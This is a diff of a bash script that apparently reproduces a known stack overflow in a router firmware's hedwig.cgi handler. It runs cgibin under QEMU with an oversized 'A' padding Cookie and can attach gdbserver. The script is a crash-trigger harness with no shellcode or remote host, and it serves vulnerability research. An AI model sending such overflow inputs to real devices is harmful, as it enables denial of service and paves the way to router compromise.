@@ -1,15 +1,18 @@
 #!/usr/bin/env bash
-# 方式 C:QEMU user 模式,只跑 cgibin,用于快速复现 hedwig.cgi 崩溃
+# 方式 C(docker 版):QEMU user 跑 cgibin
 #
-# 原理:hedwig.cgi 是 /htdocs/cgibin 的软链,qemu 用 -0 伪造 argv[0] 让 cgibin
-#       进入 hedwigcgi_main 分支,再把超长 Cookie 通过 HTTP_COOKIE 喂进去。
+# 注意:本固件的 hedwig.cgi 不是文件,而是 cgibin 按 REQUEST_URI 分发的虚拟入口,
+#       所以 ENTRY(argv[0]) 和 REQUEST_URI 必须同时设置,单进程目标是 htdocs/cgibin。
+#
+# 想免 docker 跑,用 tools/run-local.sh。
 set -euo pipefail
 
 ARCH="${ARCH:-mipsel}"
 ROOTFS="${ROOTFS:-/rootfs}"
-CGI="${CGI:-/htdocs/web/hedwig.cgi}"
-MODE="${MODE:-run}"                       # run | gdb
-PAYLOAD="${PAYLOAD:-$(python3 -c 'print("A"*1024)')}"
+ENTRY="${ENTRY:-/hedwig.cgi}"          # 虚拟入口,同时用作 argv[0] 和 REQUEST_URI
+MODE="${MODE:-run}"                    # run | gdb
+LEN="${LEN:-1038}"
+PAYLOAD="${PAYLOAD:-$(printf 'A%.0s' $(seq 1 "$LEN"))}"
 
 QEMU="qemu-${ARCH}-static"
 command -v "$QEMU" >/dev/null 2>&1 || {
@@ -18,29 +21,24 @@ command -v "$QEMU" >/dev/null 2>&1 || {
     exit 1
 }
 
-[ -d "$ROOTFS" ] || { echo "[x] rootfs 不存在: $ROOTFS(先跑 init_env.sh)" >&2; exit 1; }
-
-TARGET="$ROOTFS$CGI"
-# 软链可能指向绝对路径 /htdocs/cgibin,在宿主上解析不到,退回真实二进制
-if [ ! -x "$TARGET" ]; then
-    TARGET="$ROOTFS/htdocs/cgibin"
-fi
-[ -x "$TARGET" ] || { echo "[x] 找不到 cgibin,检查 $ROOTFS/htdocs/" >&2; exit 1; }
+[ -d "$ROOTFS" ] || { echo "[x] rootfs 不存在: $ROOTFS" >&2; exit 1; }
+BIN="$ROOTFS/htdocs/cgibin"
+[ -x "$BIN" ] || { echo "[x] 找不到 $BIN" >&2; exit 1; }
 
 echo "[*] $QEMU -L $ROOTFS"
-echo "[*] 入口: ${TARGET#"$ROOTFS"}(argv[0]=$CGI)"
+echo "[*] entry=$ENTRY  目标=${BIN#"$ROOTFS"}"
 echo "[*] Cookie: uid=<${#PAYLOAD} 字节>"
 
 ARGS=(
     -L "$ROOTFS"
-    -0 "$CGI"
+    -0 "$ENTRY"
     -E "REQUEST_METHOD=POST"
-    -E "SCRIPT_NAME=$CGI"
-    -E "REQUEST_URI=$CGI"
-    -E "CONTENT_TYPE=application/x-www-form-urlencoded"
-    -E "CONTENT_LENGTH=0"
+    -E "REQUEST_URI=$ENTRY"
+    -E "SCRIPT_NAME=$ENTRY"
     -E "SERVER_PORT=80"
     -E "SERVER_NAME=192.168.0.1"
+    -E "CONTENT_TYPE=application/x-www-form-urlencoded"
+    -E "CONTENT_LENGTH=0"
     -E "HTTP_COOKIE=uid=$PAYLOAD"
 )
 
@@ -49,13 +47,15 @@ if [ "$MODE" = "gdb" ]; then
     echo "[*] gdbserver 监听 6666,等待 gdb-multiarch 连接"
 fi
 
+ulimit -c 0 2>/dev/null || true
 set +e
-"$QEMU" "${ARGS[@]}" "$TARGET"
+"$QEMU" "${ARGS[@]}" "$BIN"
 RC=$?
 set -e
 
 echo "[*] 退出码: $RC"
-if [ "$RC" -ge 128 ] || [ "$RC" -eq 139 ]; then
-    echo "[!] 以信号退出(段错误/非法指令),说明 payload 已越过边界"
-fi
+case "$RC" in
+    139) echo "[!] SIGSEGV —— 溢出已触发" ;;
+    0|255) echo "[*] 正常返回,该长度未触发" ;;
+esac
 exit "$RC"
